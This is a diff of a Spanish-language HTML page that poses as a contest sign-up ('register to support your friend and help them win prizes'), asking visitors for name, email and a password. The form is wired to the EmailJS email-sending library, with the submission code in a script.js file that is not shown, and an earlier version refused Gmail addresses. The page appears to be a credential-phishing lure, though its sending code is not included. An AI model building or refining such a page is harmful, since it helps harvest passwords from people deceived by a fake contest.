@@ -1,40 +1,41 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Concurso: Registra tu Licencia</title>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apoya a tu Amigo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-  <div class="bg-gradient"></div>
-  <div class="wrapper">
-    <div class="card">
-      <div class="logo">🔑</div>
-      <h1>Regístrate para que tu amigo tenga más posibilidades de ganar</h1>
-      <form id="formRegistro" novalidate>
-        <div class="field">
-          <label for="nombre">Nombre Completo</label>
-          <input type="text" id="nombre" name="nombre" placeholder="Tu nombre completo" required>
-        </div>
-        <div class="field">
-          <label for="correo">Correo Electrónico</label>
-          <input type="email" id="correo" name="correo" placeholder="correo@ejemplo.com" required>
-          <span class="error-message" id="errorMail">No aceptamos Gmail, usa otro dominio</span>
-        </div>
-        <div class="field">
-          <label for="password">Contraseña</label>
-          <input type="password" id="password" name="password" placeholder="••••••••" required>
-        </div>
-        <button type="submit" class="btn">Registrar</button>
-      </form>
-    </div>
-  </div>
+    <div class="fondo-dinamico"></div>
+    
+    <main class="contenedor">
+        <div class="tarjeta">
+            <div class="cabecera">
+                <h1>¡Regístrate para apoyar a tu amigo! 🎉</h1>
+                <p>Ayúdale a ganar increíbles premios</p>
+            </div>
 
-  <!-- EmailJS SDK -->
-  <script src="https://cdn.emailjs.com/sdk/3.6.2/email.min.js"></script>
-  <script>emailjs.init('TU_USER_ID');</script>
-  <script src="script.js"></script>
+            <form id="formRegistro">
+                <div class="grupo-input">
+                    <input type="text" placeholder="Nombre completo" required>
+                </div>
+
+                <div class="grupo-input">
+                    <input type="email" placeholder="correo@ejemplo.com" required>
+                </div>
+
+                <div class="grupo-input">
+                    <input type="password" placeholder="Crea una contraseña" required>
+                </div>
+
+                <button type="submit">Continuar →</button>
+            </form>
+        </div>
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
